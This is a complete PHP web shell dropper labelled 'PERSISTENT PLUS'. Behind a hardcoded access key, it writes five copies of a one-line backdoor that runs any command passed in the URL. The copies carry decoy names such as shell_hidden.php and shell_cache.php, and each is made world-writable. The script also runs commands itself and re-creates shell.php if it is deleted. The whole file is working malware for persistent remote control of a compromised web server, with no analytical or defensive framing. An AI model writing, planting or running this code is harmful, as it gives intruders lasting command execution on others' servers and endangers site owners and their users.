<?php
// ================================================================
// PERSISTENT PLUS - Super Persistent (FIXED)
// ================================================================

// Auth
if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
    die('Access denied');
}

$shells = ['shell.php','shell_backup.php','shell_hidden.php','shell_temp.php','shell_cache.php'];
$code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>';

foreach ($shells as $s) {
    if (!file_exists($s)) {
        file_put_contents($s, $code);
        if (PHP_OS !== 'WINNT') { chmod($s, 0777); }
    }
}

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Auto-repair
if (!file_exists('shell.php')) {
    file_put_contents('shell.php', $code);
    if (PHP_OS !== 'WINNT') { chmod('shell.php', 0777); }
}
?>